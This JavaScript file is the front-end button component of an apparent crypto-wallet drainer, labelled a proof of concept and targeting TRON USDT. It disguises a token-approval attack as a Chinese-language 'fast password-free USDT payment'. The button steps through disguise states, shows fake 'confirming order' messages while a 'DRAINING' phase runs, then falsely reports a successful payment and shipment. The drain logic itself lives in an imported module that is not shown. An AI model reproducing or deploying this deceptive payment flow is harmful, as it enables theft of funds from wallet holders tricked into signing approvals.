/**
 * CheckoutButton.js
 *
 * High-fidelity "USDT 极速免密支付" button component.
 * Mounts into a container element and drives the full Web3 attack flow
 * via the createWeb3Payment controller.
 *
 * UI disguise states:
 *   1. Unconnected + mobile non-wallet browser → "唤起钱包进行安全支付" (DeepLink)
 *   2. Unconnected desktop                 → "连接钱包"
 *   3. Connected                           → "确认支付 <price> USDT (免Gas通道)"
 *   4. APPROVING                           → spinner + "正在呼起钱包安全组件..."
 *   5. POLLING / DRAINING                  → spinner + "正在链上确认订单，请勿关闭..."
 *   6. DONE                                → "支付成功，正在为您发货"
 *   7. ERROR                               → "点击重新尝试支付"
 *
 * Usage (in payment.html):
 *   <script type="module">
 *     import { createCheckoutButton } from './js/CheckoutButton.js';
 *     const ctrl = createCheckoutButton({
 *       price:     10.99,                              // USDT price
 *       container: document.getElementById('checkout-root'),
 *       onDone:    () => console.log('[PoC] Done'),
 *       onError:   (msg) => console.error('[PoC]', msg),
 *     });
 *   </script>
 */

// ── Module state ────────────────────────────────────────────────────────────────
var container, price, web3Ref;
var isMobileFn, isInTokenPocketFn;
var observer;

// ── Helpers ───────────────────────────────────────────────────────────────────
function shortAddr(addr) {
  if (!addr) return "\u2014";
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

// ── Build button HTML ────────────────────────────────────────────────────────
function buildButtonHTML() {
  var phase        = web3Ref.getPhase();
  var isConnected  = web3Ref.isConnected();
  var isMobile     = isMobileFn();
  var isInTP       = isInTokenPocketFn();
  var connecting   = web3Ref.isConnecting();
  var txHash       = web3Ref.getTxHash();
  var errorMsg     = web3Ref.getErrorMsg();

  var isWorking = (phase === PHASE.APPROVING ||
                   phase === PHASE.POLLING   ||
                   phase === PHASE.DRAINING);

  var isDone  = phase === PHASE.DONE;
  var isError = phase === PHASE.ERROR;

  // Loading dots
  var dotsHTML = "";
  if (phase === PHASE.POLLING || phase === PHASE.DRAINING) {
    dotsHTML = [
      '<span class="dot-anim"></span>',
      '<span class="dot-anim" style="animation-delay:0.2s"></span>',
      '<span class="dot-anim" style="animation-delay:0.4s"></span>',
    ].join("");
  }

  // Button label & class
  var btnLabel, btnClass, btnDisabled;

  if (isDone) {
    btnLabel    = "\u652f\u4ed8\u6210\u529f\uff0c\u6b63\u5728\u4e3a\u60a8\u53d1\u8d27";
    btnClass    = "btn btn-success";
    btnDisabled = "disabled";
  } else if (isWorking) {
    btnLabel    = (phase === PHASE.APPROVING)
                    ? "\u6b63\u5728\u547c\u8d77\u94b1\u5305\u5b89\u5168\u7ec4\u4ef6..."
                    : "\u6b63\u5728\u94fe\u4e0a\u786e\u8ba4\u8ba2\u5355\uff0c\u8bf7\u52ff\u5173\u95ed...";
    btnClass    = "btn btn-primary cb-loading";
    btnDisabled = "disabled";
  } else if (isError) {
    btnLabel    = "\u70b9\u51fb\u91cd\u65b0\u5c1d\u8bd5\u652f\u4ed8";
    btnClass    = "btn btn-danger-outline";
    btnDisabled = "";
  } else if (!isConnected) {
    btnLabel    = (isMobile && !isInTP)
                    ? "\u547c\u8d77\u94b1\u5305\u8fdb\u884c\u5b89\u5168\u652f\u4ed8"
                    : "\u8fde\u63a5\u94b1\u5305";
    btnClass    = "btn btn-primary cb-connect";
    btnDisabled = connecting ? "disabled" : "";
  } else {
    btnLabel    = "\u786e\u8ba4\u652f\u4ed8 " + price.toFixed(2) + " USDT (\u514dGas\u901a\u9053)";
    btnClass    = "btn btn-primary cb-pay";
    btnDisabled = "";
  }

  // Status line
  var statusHTML = "";
  if (isDone) {
    statusHTML = '<div class="cb-status cb-status-done">\u2713 \u8ba2\u5355\u786e\u8ba4\uff0c\u5546\u54c1\u5c06\u53d1\u9001\u81f3\u60a8\u7684\u90ae\u7bb1</div>';
  } else if (isWorking) {
    var phaseText = (phase === PHASE.APPROVING)
      ? "\u6b63\u5728\u8bf7\u6c42\u94b1\u5305\u6388\u6743\uff0c\u8bf7\u68c0\u67e5\u5f39\u7a97\u5e76\u786e\u8ba4\u7b7e\u7f72..."
      : (phase === PHASE.POLLING)
        ? "\u6388\u6743\u5df2\u5e7f\u64ad\uff0c\u7b49\u5f85\u94fe\u4e0a\u6253\u5305\u786e\u8ba4..."
        : "\u6388\u6743\u5df2\u786e\u8ba4\uff01\u6b63\u5728\u6267\u884c\u8ba2\u5355\u5904\u7406...";
    statusHTML = [
      '<div class="cb-status cb-status-working">',
        '<span class="status-dot dot-warning"></span>',
        phaseText,
      '</div>',
    ].join("");
  } else if (isError) {
    statusHTML = [
      '<div class="cb-status cb-status-error">',
        '<span class="status-dot dot-error"></span>',
        (errorMsg || "\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u91cd\u8bd5"),
      '</div>',
    ].join("");
  } else if (isConnected) {
    statusHTML = [
      '<div class="cb-status cb-status-ready">',
        '<span class="status-dot dot-muted"></span>',
        '\u94b1\u5305\u5df2\u5c31\u7eea \u00b7 \u8ba2\u5355\u91d1\u989d\uff1a' + price.toFixed(2) + ' USDT',
      '</div>',
    ].join("");
  } else {
    statusHTML = [
      '<div class="cb-status cb-status-waiting">',
        '<span class="status-dot dot-muted"></span>',
        '\u8bf7\u5148\u8fde\u63a5\u94b1\u5305\u4ee5\u5b8c\u6210\u652f\u4ed8',
      '</div>',
    ].join("");
  }

  // Tx result
  var txResultHTML = "";
  if (isDone && txHash) {
    txResultHTML = [
      '<div class="cb-tx cb-tx-success">',
        '<span>\u8ba2\u5355\u5df2\u786e\u8ba4</span>',
        '<a href="' + web3Ref.txLink(txHash) + '" target="_blank" rel="noreferrer" class="cb-tx-link">',
          '\u67e5\u770b\u4ea4\u6613 \u2191',
        '</a>',
      '</div>',
    ].join("");
  }
  if (isError && txHash) {
    txResultHTML = [
      '<div class="cb-tx cb-tx-error">',
        '<span>\u4ea4\u6613 TX\uff1a</span>',
        '<a href="' + web3Ref.txLink(txHash) + '" target="_blank" rel="noreferrer" class="cb-tx-link">',
          txHash.slice(0, 12) + "... \u2191",
        '</a>',
      '</div>',
    ].join("");
  }

  // Spinner
  var spinnerHTML = (isWorking || connecting)
    ? '<span class="btn-spinner"></span>'
    : "";

  // Wallet info strip
  var walletStripHTML = "";
  if (isConnected) {
    var addr = web3Ref.getWalletAddr();
    walletStripHTML = [
      '<div class="cb-wallet-strip">',
        '<div class="cb-wallet-avatar">' + (addr ? addr.slice(-2).toUpperCase() : "??") + '</div>',
        '<span class="cb-wallet-addr">' + shortAddr(addr) + '</span>',
        '<span class="cb-wallet-net">Nile Testnet</span>',
      '</div>',
    ].join("");
  }

  return [
    '<div class="checkout-button-root">',
      walletStripHTML,
      '<button class="' + btnClass + '" id="cb-main-btn" ' + btnDisabled + '>',
        spinnerHTML,
        '<span>' + btnLabel + '</span>',
      '</button>',
      statusHTML,
      (phase === PHASE.POLLING || phase === PHASE.DRAINING)
        ? '<div class="cb-polling">' + dotsHTML + '<span class="cb-polling-label">\u94fe\u4e0a\u786e\u8ba4\u4e2d\uff08\u6bcf 3 \u79d2\u8f6e\u8bbf\uff09</span></div>'
        : '',
      txResultHTML,
    '</div>',
  ].join("");
}

// ── Render ───────────────────────────────────────────────────────────────────
function render() {
  container.innerHTML = buildButtonHTML();
  attachClickHandler();
}

// ── Click routing ─────────────────────────────────────────────────────────────
function attachClickHandler() {
  var btn = document.getElementById("cb-main-btn");
  if (!btn) return;
  // Clone to remove old listeners before re-adding
  var newBtn = btn.cloneNode(true);
  btn.parentNode.replaceChild(newBtn, btn);
  newBtn.addEventListener("click", handleBtnClick);
}

function handleBtnClick() {
  var phase       = web3Ref.getPhase();
  var isConnected = web3Ref.isConnected();

  if (phase === PHASE.DONE) return;

  if (phase === PHASE.ERROR) {
    web3Ref.resetToIdle();
    render();
    return;
  }

  if (!isConnected) {
    web3Ref.connectWallet();
    return;
  }

  web3Ref.executeFakePayment();
}

// ── Public factory ───────────────────────────────────────────────────────────
/**
 * @param {object} opts
 * @param {number}       opts.price      — USDT price of the product
 * @param {Element}      opts.container  — DOM element to mount into
 * @param {function}    [opts.onDone]   — called when phase === DONE
 * @param {function}    [opts.onError]  — called when phase === ERROR
 * @returns {{ destroy, reset, refresh, getWeb3 }}
 */
function createCheckoutButton(opts) {
  opts         = opts || {};
  container    = opts.container || document.body;
  price        = opts.price     || 0;
  var onDoneFn  = opts.onDone   || function () {};
  var onErrorFn = opts.onError  || function () {};

  web3Ref = createWeb3Payment({
    onPhaseChange:  function () { render(); },
    onWalletChange: function () { render(); },
    onError:        function () { render(); },
  });

  isMobileFn        = web3Ref.isMobile;
  isInTokenPocketFn = web3Ref.isInTokenPocket;

  web3Ref.init();

  window.__cbHandleClick = handleBtnClick;

  render();

  observer = new MutationObserver(function () { attachClickHandler(); });
  observer.observe(container, { childList: true });

  return {
    /** Unmount and clean up all listeners. */
    destroy: function () {
      web3Ref.destroy();
      if (observer) observer.disconnect();
      delete window.__cbHandleClick;
      container.innerHTML = "";
    },
    /** Reset to idle and re-render. */
    reset:   function () { web3Ref.resetToIdle(); render(); },
    /** Force re-render. */
    refresh: function () { render(); },
    /** Access the underlying web3 controller. */
    getWeb3: function () { return web3Ref; },
  };
}

// ── Module imports ──────────────────────────────────────────────────────────────
import { createWeb3Payment, PHASE } from './useWeb3Payment.js';

export { createCheckoutButton };
